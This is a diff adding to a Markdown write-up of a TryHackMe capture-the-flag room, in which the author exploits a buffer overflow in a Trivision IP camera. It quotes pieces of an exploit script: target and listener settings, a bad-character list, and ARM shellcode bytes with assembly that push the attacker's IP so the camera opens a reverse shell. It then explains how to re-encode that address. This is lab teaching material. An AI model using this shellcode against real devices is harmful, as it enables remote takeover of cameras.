@@ -44,7 +44,45 @@ Let's have a look at port `50628` next - maybe we can access it through the brow
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/13c1fc4f-a870-44b9-80a0-f95748667583)
 
 Some Google searching for `Trivision NC-227WF Exploit` quickly leads us to the following article: [(https://no-sec.net/arm-x-challenge-breaking-the-webs/)](https://no-sec.net/arm-x-challenge-breaking-the-webs/) and just by looking at the title it is evident that we're dealing with an ARM processor architecture (and the `ARMageddon` in the challenge title is making more sense now).
-The article explains how a buffer overflow vulnerability in the Trivision camera firmware can be exploited to establish a reverse shell connection.  It conveniently also provides assembly code instructions and a python script to exploit this.
+The article explains how a buffer overflow vulnerability in the Trivision camera firmware can be exploited to establish a reverse shell connection.  It conveniently also provides [assembly code instructions](code/Snowy_ARMageddon/original_assembly_instructions.asm) and a [python script](code/Snowy_ARMageddon/original_exploit.py) to exploit this.
+
+The Python code includes the `HOST`, `LHOST` variables that need to be updated with the Camera IP address and Localhost IP address respectively. 
+```
+HOST = '10.10.106.239'
+PORT = 50628
+LHOST = [10,10,233,1]
+LPORT = 4444
+```
+
+The code then declares a variable called `BADCHARS` - tis contains the hex values that we cannot pass on to the device.... these will come into play in a short while...
+```
+BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'
+```
+
+There is also a line towards the end of the script that needs to be updated with the IP Camera's address:
+```
+s = remote('10.10.106.239', 50628)
+```
+
+Now comes the interesting bit...  The Python script includes a block of code that passes assembly instructions in the form of hex byte strings.  This includes our machine's local IP address hard-coded into the hex byte strings which will be used to establish the reverse shell.  Luckily for us, the inline documentation conviently indicates which line is tackling this and we also have the assembly code corresponding to it:
+```
+SC += b'\x59\x1f\xa0\xe3\x01\x14\xa0\xe1\xa8\x10\x81\xe2\x01\x14\xa0\xe1\xc0\x10\x81\xe2\x04\x10\x2d\xe5'   # 192.168.100.1
+```
+```
+/* ADDR */
+mov r1, #0x164
+lsl r1, #8
+add r1, #0xa8
+lsl r1, #8
+add r1, #0xc0
+push {r1}       // 192.168.100.1
+```
+
+If you're reading this and re anything like myself - you probably just experienced an involuntary inner *groan* at the site fo the assembly code...  but please stay with me for a while longer and I hope to demystify this code block for you.
+
+First of all, we can use a Dis/Assembler like https://shell-storm.org/online/Online-Assembler-and-Disassembler/ to convert between assembly instructions and the equivalent hex values that represent it.  This tool will come in useful as we work out how to replace the hex byte string with one containing our local machine's IP address.
+
+
 
 ```
 21      /* ADDR */
